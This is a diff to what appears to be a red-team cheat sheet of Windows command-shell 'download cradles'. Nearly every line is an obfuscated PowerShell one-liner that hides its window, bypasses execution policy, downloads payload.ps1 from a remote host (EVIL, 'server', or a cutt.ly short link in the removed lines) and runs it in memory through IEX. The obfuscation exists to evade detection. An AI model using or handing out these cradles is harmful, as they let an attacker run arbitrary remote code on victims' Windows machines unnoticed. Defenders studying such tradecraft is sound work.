@@ -1,14 +1,14 @@
 # Not proxy aware download cradles, which can be executed in a Windows Command Shell (cmd.exe)  
 # Windows Command Shell download cradles, not proxy aware ligthly obfuscated 
-cmd> c:\WInDowS\sySTEM32\cmD.eXE   /c  PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/payload.ps1\")"
-cmd> PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNdOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/payload.ps1\")"
+cmd> c:\WInDowS\sySTEM32\cmD.eXE   /c  PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://server/payload.ps1\")"
+cmd> PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNdOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://server/payload.ps1\")"
 
 # Windows Command Shell download cradles, not proxy aware obfuscated
-cmd> c:\wiNdoWs\sysTEM32\CmD  /c  pOWeRsheLl -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://EVIL/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"
-cmd> pOWeRshell -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://EVIL/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"
-cmd> pOWERShELl -NopROFi -wIN hidd -EXEcutiOnPoLiC BYpAsS  -COm    "$url='https://cutt.ly/WS8Vek5';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';$wc.$ds.Invoke($url)|Invoke-Expression"
-cmd> POWERShelL  -W  hId -eXECuTionpoLIC BYPaSS  -NOprOfiLe -cOmMA    "$url='https://cutt.ly/WS8Vek5';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';IEX($wc.$ds.Invoke($url))"
-cmd> POWeRsHeLl -cO   "&( ([String]''.Normalize)[23,15,46]-Join'')(([Char[]](New-Object Net.WebClient).DownloadData('http://EVIL/payload.ps1'))-Join'')"
+cmd> c:\wiNdoWs\sysTEM32\CmD  /c  pOWeRsheLl -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"
+cmd> pOWeRshell -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"
+cmd> pOWERShELl -NopROFi -wIN hidd -EXEcutiOnPoLiC BYpAsS  -COm    "$url='http://server/payload.ps1';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';$wc.$ds.Invoke($url)|Invoke-Expression"
+cmd> POWERShelL  -W  hId -eXECuTionpoLIC BYPaSS  -NOprOfiLe -cOmMA    "$url='http://server/payload.ps1';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';IEX($wc.$ds.Invoke($url))"
+cmd> POWeRsHeLl -cO   "&( ([String]''.Normalize)[23,15,46]-Join'')(([Char[]](New-Object Net.WebClient).DownloadData('http://server/payload.ps1'))-Join'')"
 
 
 # Proxy aware download cradles, which can be executed in a Windows Command Shell (cmd.exe)  
